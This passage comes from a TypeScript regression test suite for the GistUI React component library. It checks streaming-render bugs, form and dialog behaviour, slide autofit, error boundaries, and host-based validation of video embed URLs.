/**
 * Regression tests for reviewed bugs (X1…X25, S7…S18). Streaming bugs are reproduced the way model
 * output arrives: the `source` prop grows a few characters per render, with `streaming` true.
 */
import { beforeAll, describe, expect, mock, test } from "bun:test";
import { act, StrictMode, useState, type ReactNode } from "react";
import { createRoot } from "react-dom/client";
import { createLibrary, defineComponent, GistUI, useDesign, type ComponentProps, type GistUIAction, type GistUIProps } from "../src/index";
import { preloadAll, ui } from "../src/ui";
import { refit, type Fit } from "@gistui/headless";

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

beforeAll(() => preloadAll());

function mount(el: ReactNode) {
  const host = document.createElement("div");
  document.body.appendChild(host);
  const root = createRoot(host);
  act(() => root.render(el));
  return {
    host,
    rerender: (next: ReactNode) => act(() => root.render(next)),
    unmount: () => {
      act(() => root.unmount());
      host.remove();
    },
  };
}

/** Streams a program in, `step` characters per render, then ends the stream. */
function streamIn(src: string, extra: Partial<GistUIProps> = {}, step = 3) {
  const m = mount(<GistUI library={ui} {...extra} source="" streaming />);
  for (let i = step; i < src.length; i += step) m.rerender(<GistUI library={ui} {...extra} source={src.slice(0, i)} streaming />);
  m.rerender(<GistUI library={ui} {...extra} source={src} streaming={false} />);
  return m;
}

const q = (host: HTMLElement, sel: string) => host.querySelectorAll(sel);
const click = (el: Element | null | undefined) => act(() => (el as HTMLElement).click());
const wait = (ms = 0) => act(() => new Promise<void>((r) => setTimeout(r, ms)));
const fieldErrors = (host: HTMLElement) => Array.from(host.querySelectorAll(".gistui-field__error")).map((e) => e.textContent);
/** Sets a React-controlled input the way typing does. */
const typeInto = (input: HTMLInputElement, value: string) =>
  act(() => {
    Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value")!.set!.call(input, value);
    input.dispatchEvent(new Event("input", { bubbles: true }));
  });
const quiet = async <T,>(fn: () => T | Promise<T>): Promise<T> => {
  const orig = console.error;
  console.error = () => {};
  try {
    return await fn();
  } finally {
    console.error = orig;
  }
};

describe("X1: a control that streams in keeps its initial value", () => {
  test("Checkbox and Switch: `checked` arrives after the node mounted", () => {
    const a = streamIn(`root = Checkbox("tos", "Accept", checked:true)\n`);
    expect(a.host.querySelector<HTMLInputElement>('input[name="tos"]')!.checked).toBe(true);
    expect(a.host.querySelector(".gistui-checkbox")!.getAttribute("data-state")).toBe("checked");
    // …until the user touches it: then the control is theirs.
    click(a.host.querySelector('input[name="tos"]'));
    expect(a.host.querySelector<HTMLInputElement>('input[name="tos"]')!.checked).toBe(false);
    a.unmount();
    const b = streamIn(`root = Switch("news", "News", checked:true)\n`);
    expect(b.host.querySelector<HTMLInputElement>('input[name="news"]')!.checked).toBe(true);
    b.unmount();
  });

  test("Slider, RadioGroup, CheckboxGroup and TagInput: `value:` arrives after the node mounted", () => {
    const s = streamIn(`root = Slider("vol", "Volume", value:40)\n`);
    expect(s.host.querySelector<HTMLInputElement>('input[type="range"]')!.value).toBe("40");
    s.unmount();
    const r = streamIn(`root = RadioGroup("plan", "Plan", ["Free", "Pro"], value:"Pro")\n`);
    expect(q(r.host, ".gistui-choice__item")[1]!.getAttribute("data-state")).toBe("checked");
    r.unmount();
    const c = streamIn(`root = CheckboxGroup("topics", "Topics", ["AI", "Data"], value:["Data"])\n`);
    expect(Array.from(c.host.querySelectorAll<HTMLInputElement>('input[name="topics"]')).map((i) => i.checked)).toEqual([false, true]);
    c.unmount();
    const t = streamIn(`root = TagInput("cc", "CC", value:["ada", "grace"])\n`);
    expect(Array.from(q(t.host, ".gistui-tag")).map((e) => e.textContent)).toEqual(["ada", "grace"]);
    t.unmount();
  });

  test("DatePicker and TimePicker: `value:` arrives after the node mounted", () => {
    const d = streamIn(`root = DatePicker("due", "Due", value:"2026-10-01")\n`);
    expect(d.host.querySelector<HTMLInputElement>('input[type="hidden"][name="due"]')?.value).toBe("2026-10-01");
    d.unmount();
    const dt = streamIn(`root = DatePicker("at", "Starts", time, value:"2026-10-01T14:30")\n`);
    expect(dt.host.querySelector<HTMLInputElement>('input[type="hidden"][name="at"]')?.value).toBe("2026-10-01T14:30");
    dt.unmount();
    const t = streamIn(`root = TimePicker("slot", "Time", value:"09:30")\n`);
    expect(t.host.querySelector('[data-part="value-text"]')!.textContent).toBe("9:30 AM");
    t.unmount();
  });
});

describe("X2: Table order and Accordion open survive streaming", () => {
  test("`order:` sorts a table whose data arrives after it mounted", () => {
    const rows = Array.from({ length: 6 }, (_, i) => `|r${i}|${(i * 7) % 6}`).join("\n");
    const { host, unmount } = streamIn(`root = Table(t, sort, order:"-Score")\nt = |Name|Score\n${rows}\n`, {}, 5);
    expect(q(host, "tbody tr td")[1]!.textContent).toBe("5");
    // The user's own sort wins afterwards: descending → unsorted is the source order, not `order` again.
    click(q(host, ".gistui-table__sort")[1]);
    expect(host.querySelector("th[aria-sort]")).toBeNull();
    expect(q(host, "tbody tr td")[0]!.textContent).toBe("r0");
    unmount();
  });

  test("an Item's `open` flag opens it when it arrives after the Item mounted", () => {
    const { host, unmount } = streamIn(`root = Accordion(a, b)\na = Item("First", "One")\nb = Item("Second", "Two", open)\n`);
    const states = Array.from(q(host, ".gistui-collapse")).map((e) => e.getAttribute("data-state"));
    expect(states).toEqual(["closed", "open"]);
    unmount();
  });
});

describe("X3: Slide autofit settles instead of oscillating", () => {
  // A text-heavy page: at scale `fit` the content is laid out 100/fit % wide, so its text wraps
  // into fewer lines. 26px lines of 60 characters at full width, under a 120px heading.
  const page = (chars: number) => (fit: number) => 120 + 26 * Math.ceil((chars * fit) / 60);
  const START: Fit = { fit: 1, search: null, base: null };
  /** Measures like the hook does: after every change of scale, and again on every observer callback. */
  const run = (state: Fit, avail: number, need: (fit: number) => number, times = 240) => {
    const fits: number[] = [];
    for (let i = 0; i < times; i++) {
      const next = refit(state, avail, need(state.fit));
      if (next.fit !== state.fit) fits.push(next.fit);
      state = next;
    }
    return { state, fits };
  };
  const shown = (need: (fit: number) => number, fit: number) => need(fit) * fit;

  test("too tall: a short search, then the same scale for every later measurement", () => {
    const need = page(1400);
    const { state, fits } = run(START, 470, need);
    // The old rule changed the scale on each of these 240 measurements (0.672 ↔ 0.851 on such a page).
    expect(fits.length).toBeGreaterThan(0);
    expect(fits.length).toBeLessThanOrEqual(8);
    expect(state.search).toBeNull();
    expect(state.fit).toBeLessThan(1);
    // It fits…
    expect(shown(need, state.fit)).toBeLessThanOrEqual(471);
    // …and is the largest scale that does, within the search step (a single shrink to
    // avail / need would stop near 0.67 × that: the widened text is much shorter).
    expect(shown(need, state.fit + 0.03)).toBeGreaterThan(471);
    // Settled means settled: nothing changes on later measurements.
    expect(run(state, 470, need).fits).toEqual([]);
  });

  test("it grows back only for an outside reason, and then settles again", () => {
    const need = page(1400);
    const small = run(START, 470, need).state;
    // The box got taller: a larger scale, found in a few steps, then stable.
    const taller = run(small, 640, need);
    expect(taller.state.fit).toBeGreaterThan(small.fit);
    expect(taller.fits.length).toBeLessThanOrEqual(8);
    expect(taller.state.search).toBeNull();
    expect(shown(need, taller.state.fit)).toBeLessThanOrEqual(641);
    expect(shown(need, taller.state.fit + 0.03)).toBeGreaterThan(641);
    // The content got shorter: back to full size.
    expect(run(small, 470, page(300)).state.fit).toBe(1);
    // The content grew (more streamed in): a smaller scale; never below 40%.
    const more = run(small, 470, page(2600));
    expect(more.state.fit).toBeLessThan(small.fit);
    expect(more.fits.length).toBeLessThanOrEqual(8);
    expect(shown(page(2600), more.state.fit)).toBeLessThanOrEqual(471);
    const floor = run(START, 100, page(9000));
    expect(floor.state.fit).toBe(0.4);
    expect(floor.state.search).toBeNull();
  });

  test("content that fits is left alone; content whose height does not depend on its width settles in one step", () => {
    const { state, fits } = run(START, 470, page(300));
    expect(fits).toEqual([]);
    expect(state.fit).toBe(1);
    // An image-like block: 900px whatever the width.
    const fixed = run(START, 450, () => 900);
    expect(fixed.fits).toEqual([0.5]);
    expect(fixed.state.search).toBeNull();
  });
});

describe("X4: a Stat shows its new value", () => {
  test('"120ms" → "n/a": the count-up of the old value does not overwrite the new text', async () => {
    // Animations are off in automation; turn them on, as in a browser.
    const nav = Object.getOwnPropertyDescriptor(navigator, "webdriver");
    Object.defineProperty(navigator, "webdriver", { value: false, configurable: true });
    try {
      const src = `$v = "120ms"\nroot = Stack(s, b)\ns = Stat("Latency", $v)\nb = Button("Fail", do:[@set($v, "n/a")])\n`;
      const { host, unmount } = mount(<GistUI library={ui} source={src} />);
      const value = () => host.querySelector(".gistui-stat__value")!.textContent;
      // Waiting to scroll into view: the count-up starts from zero.
      expect(value()).toBe("0ms");
      await act(async () => host.querySelector<HTMLElement>(".gistui-button")!.click());
      await wait(10);
      expect(value()).toBe("n/a");
      unmount();
    } finally {
      if (nav) Object.defineProperty(navigator, "webdriver", nav);
      else delete (navigator as { webdriver?: boolean }).webdriver;
    }
  });
});

describe("X5: step forms see fields that have no named control while empty", () => {
  const visibleStep = (host: HTMLElement) => Array.from(q(host, "[data-step]")).findIndex((s) => !s.hasAttribute("hidden"));
  const next = (host: HTMLElement) => host.querySelector<HTMLElement>("button[data-auto]");

  for (const [name, field] of [
    ["TagInput", `TagInput("f", "Field", required)`],
    ["Combobox", `Combobox("f", "Field", ["A", "B"], required)`],
    ["DatePicker", `DatePicker("f", "Field", required)`],
  ] as const) {
    test(`an empty required ${name} stops "Continue"`, () => {
      const src = `root = Form("s", Step("One", ${field}), Step("Two", Input("name", "Name")), submit:"Create")\n`;
      const { host, unmount } = mount(<GistUI library={ui} source={src} />);
      click(next(host));
      expect(visibleStep(host)).toBe(0);
      expect(fieldErrors(host)).toHaveLength(1);
      unmount();
    });
  }

  test("a failed final submit goes back to the step with the error", async () => {
    const actions: GistUIAction[] = [];
    const src = [
      `$tags = ["a"]`,
      `root = Form("s", Step("One", TagInput("tags", "Tags", required, bind:$tags)), Step("Two", Input("name", "Name"), Button("Clear", v:secondary, do:[@set($tags, [])])), submit:"Create")`,
      "",
    ].join("\n");
    const { host, unmount } = mount(<GistUI library={ui} source={src} onAction={(a) => actions.push(a)} />);
    click(next(host));
    expect(visibleStep(host)).toBe(1);
    await act(async () => Array.from(host.querySelectorAll<HTMLElement>("button")).find((b) => b.textContent === "Clear")!.click());
    await wait(5);
    click(next(host));
    expect(actions.filter((a) => a.type === "submit")).toHaveLength(0);
    expect(visibleStep(host)).toBe(0);
    expect(fieldErrors(host)).toHaveLength(1);
    unmount();
  });
});

describe("X6: Enter submits the form, it does not save a draft", () => {
  /** What Enter in a text field activates: the form's first submit button, in tree order. */
  const defaultButton = (host: HTMLElement) => host.querySelector<HTMLButtonElement>('form button[type="submit"], form button:not([type])');

  test("draft:\"…\" adds a button that is not the form's default button", () => {
    const actions: GistUIAction[] = [];
    const { host, unmount } = mount(<GistUI library={ui} source={`root = Form("f", Input("name", "Name", required), draft:"Save draft")\n`} onAction={(a) => actions.push(a)} />);
    const def = defaultButton(host)!;
    expect(def.hasAttribute("data-draft")).toBe(false);
    click(def);
    expect(fieldErrors(host)).toEqual(["Name is required"]);
    expect(actions).toHaveLength(0);
    // The draft button still saves a draft (required fields may be empty).
    expect(host.querySelector<HTMLButtonElement>("[data-draft]")!.type).toBe("button");
    click(host.querySelector("[data-draft]"));
    expect(actions[0]).toMatchObject({ type: "submit", partial: true });
    unmount();
  });

  test("Button(type:draft) before the fields is not the default button either", () => {
    const actions: GistUIAction[] = [];
    const src = `root = Form("f", Button("Save draft", v:secondary, type:draft), Input("name", "Name", required), Button("Save"))\n`;
    const { host, unmount } = mount(<GistUI library={ui} source={src} onAction={(a) => actions.push(a)} />);
    expect(defaultButton(host)!.textContent).toBe("Save");
    click(host.querySelector("[data-draft]"));
    expect(actions[0]).toMatchObject({ type: "submit", partial: true });
    unmount();
  });
});

describe("X7: a bound TagInput in a Form is validated once per change", () => {
  test("adding a tag does not start an endless re-validation", async () => {
    const src = `$tags = []\nroot = Form("f", TagInput("tags", "Tags", bind:$tags, required), validate:change)\n`;
    const { host, unmount } = mount(<GistUI library={ui} source={src} />);
    let changes = 0;
    host.addEventListener("change", () => changes++);
    const input = host.querySelector<HTMLInputElement>(".gistui-taginput__input")!;
    typeInto(input, "alpha");
    act(() => void input.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true })));
    expect(q(host, ".gistui-tag")).toHaveLength(1);
    await wait(200);
    expect(changes).toBe(1);
    unmount();
  });
});

describe("X8: a new program does not inherit the previous program's component state", () => {
  test("a submitted form, a selected tab", () => {
    const A = `root = Stack(f, t)\nf = Form("a", Input("q", "Q"), success:"Thanks A")\nt = Tabs(x, y)\nx = Tab("One", "1")\ny = Tab("Two", "2")\n`;
    const B = `root = Stack(f, t)\nf = Form("b", Input("email", "Email"), success:"Thanks B")\nt = Tabs(x, y)\nx = Tab("Uno", "1")\ny = Tab("Dos", "2")\n`;
    const { host, rerender, unmount } = mount(<GistUI library={ui} source={A} />);
    click(host.querySelector('button[type="submit"]'));
    click(q(host, '[role="tab"]')[1]);
    expect(host.textContent).toContain("Thanks A");
    rerender(<GistUI library={ui} source={B} />);
    expect(host.textContent).not.toContain("Thanks");
    expect(host.querySelector('input[name="email"]')).not.toBeNull();
    expect(host.querySelector('[role="tab"][aria-selected="true"]')!.textContent).toBe("Uno");
    unmount();
  });
});

describe("X10: a bound number Input keeps what is typed", () => {
  test("typing 1.05 gives 1.05, not 15", () => {
    const changes: unknown[] = [];
    const src = `$n = null\nroot = Input("amount", "Amount", type:number, bind:$n)\n`;
    const { host, unmount } = mount(<GistUI library={ui} source={src} onStateChange={(_, v) => changes.push(v)} />);
    const input = host.querySelector<HTMLInputElement>('input[name="amount"]')!;
    act(() => input.focus());
    // One key at a time, appended to what the field shows (as typing does).
    for (const ch of "1.05") typeInto(input, input.value + ch);
    expect(input.value).toBe("1.05");
    expect(changes.at(-1)).toBe(1.05);
    // After blur the field shows the number in state.
    act(() => input.blur());
    expect(input.value).toBe("1.05");
    unmount();
  });
});

describe("X11: a Dialog opened from inside a Form", () => {
  const src = [
    `root = Form("outer", Input("name", "Name", required), Button("More", v:secondary, opens:dlg), Button("Save"))`,
    `dlg = Dialog("Details", Form("inner", Input("note", "Note", required), Button("Add")), Button("OK"))`,
    "",
  ].join("\n");

  test("renders at the root, outside the outer <form>, in its own form scope", () => {
    const { host, unmount } = mount(<GistUI library={ui} source={src} />);
    click(host.querySelector('[aria-haspopup="dialog"]'));
    const dialog = host.querySelector(".gistui-dialog")!;
    expect(dialog.parentElement!.classList.contains("gistui")).toBe(true);
    expect(dialog.closest("form")).toBeNull();
    // "OK" is a primary button outside the inner form: not a submit button of the outer one.
    const ok = Array.from(dialog.querySelectorAll<HTMLButtonElement>("button")).find((b) => b.textContent === "OK")!;
    expect(ok.type).toBe("button");
    unmount();
  });

  test("its form's submit is its own: the outer form is neither validated nor sent", () => {
    const actions: GistUIAction[] = [];
    const { host, unmount } = mount(<GistUI library={ui} source={src} onAction={(a) => actions.push(a)} />);
    click(host.querySelector('[aria-haspopup="dialog"]'));
    const dialog = host.querySelector(".gistui-dialog")!;
    click(dialog.querySelector('button[type="submit"]'));
    expect(fieldErrors(host)).toEqual(["Note is required"]);
    typeInto(dialog.querySelector<HTMLInputElement>('input[name="note"]')!, "hello");
    click(dialog.querySelector('button[type="submit"]'));
    const submits = actions.filter((a) => a.type === "submit") as Extract<GistUIAction, { type: "submit" }>[];
    expect(submits.map((s) => s.form)).toEqual(["inner"]);
    expect(fieldErrors(host)).toEqual([]);
    unmount();
  });

  test("keeps the presets of the section it was opened from", () => {
    const { host, unmount } = mount(<GistUI library={ui} source={`root = Page(Button("Open", opens:d), accent:rose)\nd = Dialog("Hi", "Body")\n`} />);
    click(host.querySelector('[aria-haspopup="dialog"]'));
    expect(host.querySelector(".gistui-dialog")!.getAttribute("data-gistui-color")).toBe("rose");
    unmount();
  });
});

describe("X12: Button(type:reset) resets component-owned state too", () => {
  test("a checked Checkbox, CheckboxGroup, Switch and a moved Slider go back to their initial values", async () => {
    const actions: GistUIAction[] = [];
    const src = `root = Form("f", Checkbox("tos", "Accept"), Switch("news", "News", checked), CheckboxGroup("topics", "Topics", ["AI", "Data"]), RadioGroup("plan", "Plan", ["Free", "Pro"], value:"Free"), Button("Reset", v:secondary, type:reset), Button("Save"))\n`;
    const { host, unmount } = mount(<GistUI library={ui} source={src} onAction={(a) => actions.push(a)} />);
    const input = (sel: string) => host.querySelector<HTMLInputElement>(sel)!;
    click(input('input[name="tos"]'));
    click(input('input[name="news"]'));
    click(input('input[name="topics"][value="AI"]'));
    click(q(host, '[data-gistui="RadioGroup"] .gistui-choice__item')[1]);
    expect(host.querySelector(".gistui-checkbox")!.getAttribute("data-state")).toBe("checked");
    click(Array.from(host.querySelectorAll("button")).find((b) => b.textContent === "Reset"));
    await wait(5);
    expect(host.querySelector(".gistui-checkbox")!.getAttribute("data-state")).toBe("unchecked");
    expect(input('input[name="tos"]').checked).toBe(false);
    expect(host.querySelector(".gistui-switch")!.getAttribute("data-state")).toBe("checked");
    expect(input('input[name="news"]').checked).toBe(true);
    expect(input('input[name="topics"][value="AI"]').checked).toBe(false);
    expect(q(host, '[data-gistui="RadioGroup"] .gistui-choice__item')[0]!.getAttribute("data-state")).toBe("checked");
    click(host.querySelector('button[type="submit"]'));
    expect(actions.at(-1)).toMatchObject({ type: "submit", values: { tos: false, news: true, topics: [], plan: "Free" } });
    unmount();
  });
});

describe("X13/S17: Video", () => {
  test('ratio:"4:3" becomes a valid aspect ratio', () => {
    const { host, unmount } = mount(<GistUI library={ui} source={`root = Video("https://example.com/a.mp4", ratio:"4:3")\n`} />);
    expect(host.querySelector<HTMLElement>(".gistui-video")!.style.getPropertyValue("--gistui-ratio")).toBe("4 / 3");
    expect(host.querySelector("video")!.getAttribute("referrerpolicy")).toBe("no-referrer");
    unmount();
  });

  test("an embed is sandboxed, and chosen by the URL's host, not by a substring", () => {
    const yt = mount(<GistUI library={ui} source={`root = Video("https://www.youtube.com/watch?v=dQw4w9WgXcQ")\n`} />);
    const frame = yt.host.querySelector("iframe")!;
    expect(frame.getAttribute("src")).toBe("https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ");
    expect(frame.getAttribute("sandbox")).toBe("allow-scripts allow-same-origin allow-presentation");
    // Origin only: YouTube refuses to play without any referrer.
    expect(frame.getAttribute("referrerpolicy")).toBe("strict-origin-when-cross-origin");
    yt.unmount();
    const evil = mount(<GistUI library={ui} source={`root = Video("https://evil.example/clip.mp4?from=youtube.com/watch?v=dQw4w9WgXcQ")\n`} />);
    expect(evil.host.querySelector("iframe")).toBeNull();
    expect(evil.host.querySelector("video")).not.toBeNull();
    evil.unmount();
  });

  test("embedOf: YouTube and Vimeo hosts only", async () => {
    const { embedOf } = await import("../src/ui/extras");
    expect(embedOf("https://youtu.be/dQw4w9WgXcQ")).toBe("https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ");
    expect(embedOf("https://youtube.com/shorts/dQw4w9WgXcQ")).toBe("https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ");
    expect(embedOf("https://vimeo.com/123456")).toBe("https://player.vimeo.com/video/123456?dnt=1");
    expect(embedOf("https://player.vimeo.com/video/123456")).toBe("https://player.vimeo.com/video/123456?dnt=1");
    expect(embedOf("https://notyoutube.com/watch?v=dQw4w9WgXcQ")).toBeNull();
    expect(embedOf("https://youtube.com.evil.example/watch?v=dQw4w9WgXcQ")).toBeNull();
    expect(embedOf("https://example.com/vimeo.com/123456")).toBeNull();
    expect(embedOf("/relative/youtu.be/dQw4w9WgXcQ")).toBeNull();
  });
});

describe("X14/S7: Diagram uses the bundled Mermaid, with error rendering suppressed", () => {
  test("`window.mermaid` is ignored; initialize gets suppressErrorRendering", async () => {
    const configs: Record<string, unknown>[] = [];
    mock.module("mermaid", () => ({
      default: { initialize: (c: Record<string, unknown>) => void configs.push(c), render: async () => ({ svg: '<svg data-from="module"></svg>' }) },
    }));
    let globalUsed = false;
    const g = globalThis as { mermaid?: unknown };
    g.mermaid = {
      initialize: () => void (globalUsed = true),
      render: async () => ((globalUsed = true), { svg: '<svg data-from="global"></svg>' }),
    };
    try {
      const { host, unmount } = mount(<GistUI library={ui} source={`root = Diagram("graph TD; A-->B")\n`} />);
      for (let i = 0; i < 50 && !host.querySelector(".gistui-diagram__svg"); i++) await wait(10);
      expect(globalUsed).toBe(false);
      expect(host.querySelector('.gistui-diagram__svg svg[data-from="module"]')).not.toBeNull();
      expect(configs[0]).toMatchObject({ suppressErrorRendering: true, securityLevel: "strict", startOnLoad: false });
      unmount();
    } finally {
      delete g.mermaid;
    }
  });
});

describe("found on the way: a Switch that is on submits true", () => {
  test("the Form reads a Switch as a boolean", () => {
    const actions: GistUIAction[] = [];
    const { host, unmount } = mount(<GistUI library={ui} source={`root = Form("f", Switch("news", "News", checked), Switch("sms", "SMS"), Button("Save"))\n`} onAction={(a) => actions.push(a)} />);
    click(host.querySelector('button[type="submit"]'));
    expect(actions[0]).toMatchObject({ type: "submit", values: { news: true, sms: false } });
    unmount();
  });
});

describe("X15: error boundaries", () => {
  const Boom = defineComponent({
    name: "Boom",
    props: {},
    component: () => {
      throw new Error("kaput");
    },
  });
  const Hello = defineComponent({ name: "Hello", args: ["name"], props: { name: { type: "string" } }, component: ({ props }) => <p className="hello">Hi {String(props.name)}</p> });
  // Throws while its statement is still streaming (before its argument has arrived).
  const Picky = defineComponent({
    name: "Picky",
    args: ["name"],
    props: { name: { type: "string" } },
    component: ({ props }) => {
      if (typeof props.name !== "string" || !props.name.endsWith("!")) throw new Error("not ready");
      return <p className="picky">{props.name}</p>;
    },
  });
  const part = (name: string) => ({ spec: ui.core.get(name)!.spec, component: ui.components.get(name)! });
  const lib = createLibrary({ components: [Boom, Hello, Picky, part("Stack"), part("Card")] });

  test("a root that throws is contained in <GistUI>", async () => {
    const m = await quiet(() => mount(<GistUI library={lib} source={`root = Boom()\n`} />));
    expect(m.host.querySelector('.gistui [role="alert"]')!.textContent).toContain("kaput");
    m.unmount();
  });

  test("an @each item that throws is contained, and its siblings render", async () => {
    const src = `root = Stack(list, b)\nrows = [{n:"a"}, {n:"b"}]\nlist = @each(rows, r => Boom())\nb = Hello("Ann")\n`;
    const m = await quiet(() => mount(<GistUI library={lib} source={src} />));
    expect(q(m.host, '[role="alert"]')).toHaveLength(2);
    expect(m.host.querySelector(".hello")!.textContent).toBe("Hi Ann");
    m.unmount();
  });

  test("a nested node that threw while streaming renders once it is complete", async () => {
    const src = `root = Stack(c)\nc = Card(p)\np = Picky("Ann!")\n`;
    const m = await quiet(() => {
      const m = mount(<GistUI library={lib} source="" streaming />);
      for (let i = 3; i < src.length; i += 3) m.rerender(<GistUI library={lib} source={src.slice(0, i)} streaming />);
      m.rerender(<GistUI library={lib} source={src} />);
      return m;
    });
    expect(m.host.querySelector('[role="alert"]')).toBeNull();
    expect(m.host.querySelector(".picky")!.textContent).toBe("Ann!");
    m.unmount();
  });
});

describe("X16: the deck leaves keys to the controls inside a slide", () => {
  const key = (el: Element, k: string) => act(() => void el.dispatchEvent(new KeyboardEvent("keydown", { key: k, bubbles: true, cancelable: true })));
  const src = [
    `root = Slides(a, b, ratio:"auto")`,
    `a = Slide(Input("q", "Query"), Tabs(Tab("One", "1"), Tab("Two", "2")))`,
    `b = Slide("Second")`,
    "",
  ].join("\n");

  test("arrow keys in an input or on a tab do not change the slide; elsewhere they do", () => {
    const { host, unmount } = mount(<GistUI library={ui} source={src} />);
    const count = () => host.querySelector(".gistui-slides__count")!.textContent;
    expect(count()).toBe("1 / 2");
    key(host.querySelector('input[name="q"]')!, "ArrowRight");
    expect(count()).toBe("1 / 2");
    key(host.querySelector('[role="tab"]')!, "ArrowRight");
    expect(count()).toBe("1 / 2");
    expect(host.querySelector('[role="tab"][aria-selected="true"]')!.textContent).toBe("Two");
    key(host.querySelector(".gistui-slides")!, "ArrowRight");
    expect(count()).toBe("2 / 2");
    unmount();
  });
});

describe("X17: focus returns to what opened a Dialog or Lightbox", () => {
  /** Records `close()` calls on native dialogs, and whether the dialog was still in the document. */
  const spyClose = () => {
    const orig = HTMLDialogElement.prototype.close;
    const calls: boolean[] = [];
    HTMLDialogElement.prototype.close = function (this: HTMLDialogElement, ...args: []) {
      calls.push(this.isConnected);
      return orig.apply(this, args);
    };
    return { calls, restore: () => void (HTMLDialogElement.prototype.close = orig) };
  };

  test("Dialog: closed natively before it unmounts, and its button gets focus back", async () => {
    const spy = spyClose();
    try {
      const { host, unmount } = mount(<GistUI library={ui} source={`root = Button("Invite", opens:dlg)\ndlg = Dialog("Invite", Input("email", "Email"), Button("Cancel", v:ghost, close))\n`} />);
      const button = host.querySelector<HTMLElement>('[aria-haspopup="dialog"]')!;
      act(() => button.focus());
      click(button);
      await wait(5);
      act(() => host.querySelector<HTMLElement>('.gistui-dialog input[name="email"]')!.focus());
      click(Array.from(host.querySelectorAll(".gistui-dialog button")).find((b) => b.textContent === "Cancel"));
      await wait(260);
      expect(host.querySelector(".gistui-dialog")).toBeNull();
      expect(spy.calls).toEqual([true]);
      expect(document.activeElement).toBe(button);
      unmount();
    } finally {
      spy.restore();
    }
  });

  test("Lightbox: closed natively before it unmounts, and the picture gets focus back", async () => {
    const spy = spyClose();
    try {
      const { host, unmount } = mount(<GistUI library={ui} source={`root = Image("https://example.com/a.png", "A", zoom)\n`} />);
      const opener = host.querySelector<HTMLElement>(".gistui-image__zoom")!;
      act(() => opener.focus());
      click(opener);
      await wait(5);
      const close = host.querySelector<HTMLElement>('.gistui-lightbox [aria-label="Close"]')!;
      act(() => close.focus());
      click(close);
      expect(host.querySelector(".gistui-lightbox")).toBeNull();
      expect(spy.calls).toEqual([true]);
      expect(document.activeElement).toBe(opener);
      unmount();
    } finally {
      spy.restore();
    }
  });
});

describe("X18: Tabs keep a selected tab when the tab set is replaced", () => {
  test("Tabs(a, b) → Tabs(c, d): the first new tab is selected", () => {
    const A = `root = Tabs(a, b)\na = Tab("A", "one")\nb = Tab("B", "two")\n`;
    const B = `root = Tabs(c, d)\nc = Tab("C", "three")\nd = Tab("D", "four")\n`;
    const { host, rerender, unmount } = mount(<GistUI library={ui} source={A} streaming />);
    click(q(host, '[role="tab"]')[1]);
    // The same stream restates `root` with other tabs.
    rerender(<GistUI library={ui} source={A + B} streaming />);
    expect(host.querySelector('[role="tab"][aria-selected="true"]')?.textContent).toBe("C");
    expect(Array.from(q(host, '[role="tabpanel"]')).map((p) => p.hasAttribute("hidden"))).toEqual([false, true]);
    unmount();
  });
});

describe("X19: the end of a program is reported once, and never after unmount", () => {
  const BROKEN = `root = Page(Card(Header("Hi"), colour:"red"), Txt("hello"), missing)\nnote = Callout("Placed by autofix")\n`;

  test("StrictMode: a `source` program is parsed once and onError is called once", async () => {
    const errors: unknown[][] = [];
    let flushes = 0;
    const { unmount } = mount(
      <StrictMode>
        <GistUI library={ui} source={`root = Card(Header("Fine"))\n`} onError={(e) => errors.push(e)} devtools={{ onFlush: () => void flushes++ }} />
      </StrictMode>,
    );
    await wait(30);
    expect(errors).toEqual([[]]);
    // One engine parsed the program in an effect before; a second one parsed it again.
    expect(flushes).toBeLessThanOrEqual(2);
    unmount();
  });

  test("StrictMode: a repaired program reports once, and its buttons still work", async () => {
    const fixes: unknown[] = [];
    const errors: unknown[][] = [];
    const actions: GistUIAction[] = [];
    const src = `root = Page(Card(Header("Hi"), colour:"red"), Button("Go", do:[@send("went")]))\n`;
    const { host, unmount } = mount(
      <StrictMode>
        <GistUI library={ui} source={src} onAutofix={(r) => fixes.push(r)} onError={(e) => errors.push(e)} onAction={(a) => actions.push(a)} />
      </StrictMode>,
    );
    for (let i = 0; i < 100 && !errors.length; i++) await wait(5);
    await wait(20);
    expect(fixes).toHaveLength(1);
    expect(errors).toEqual([[]]);
    // The engine survived StrictMode's unmount and remount: actions still run.
    await act(async () => host.querySelector<HTMLElement>(".gistui-button")!.click());
    await wait(5);
    expect(actions).toEqual([{ type: "send", message: "went", nodeId: expect.any(String) }]);
    unmount();
  });

  test("nothing is reported after unmount", async () => {
    const fixes: unknown[] = [];
    const errors: unknown[] = [];
    const { unmount } = mount(<GistUI library={ui} source={BROKEN} onAutofix={(r) => fixes.push(r)} onError={(e) => errors.push(e)} />);
    unmount();
    await wait(80);
    expect(fixes).toEqual([]);
    expect(errors).toEqual([]);
  });

  test("a stream that ends, and is repaired, before the next render is still shown repaired", async () => {
    // The repair chunk is already loaded, so everything below settles in microtasks.
    await import("@gistui/core/repair");
    async function* once() {
      yield BROKEN;
    }
    const fixes: unknown[] = [];
    const errors: unknown[][] = [];
    const host = document.createElement("div");
    document.body.appendChild(host);
    const root = createRoot(host);
    const env = globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean };
    // Outside act(): effects and re-renders are scheduled as in an app, not flushed at once.
    env.IS_REACT_ACT_ENVIRONMENT = false;
    try {
      root.render(<GistUI library={ui} stream={once()} onAutofix={(r) => fixes.push(r)} onError={(e) => errors.push(e)} />);
      for (let i = 0; i < 100 && !errors.length; i++) await new Promise((r) => setTimeout(r, 5));
      await new Promise((r) => setTimeout(r, 20));
    } finally {
      env.IS_REACT_ACT_ENVIRONMENT = true;
    }
    expect(fixes).toHaveLength(1);
    expect(errors).toEqual([[]]);
    expect(host.querySelector(".gistui-callout")?.textContent).toContain("Placed by autofix");
    act(() => root.unmount());
    host.remove();
  });
});

describe("X20: no skeleton beside a button whose Dialog has not arrived", () => {
  test("Button(opens:x) while `x` is still to come", () => {
    const { host, rerender, unmount } = mount(<GistUI library={ui} source={`root = Stack(b)\nb = Button("Invite", opens:dlg)\n`} streaming />);
    expect(host.querySelector(".gistui-button")).not.toBeNull();
    expect(q(host, ".gistui-skeleton")).toHaveLength(0);
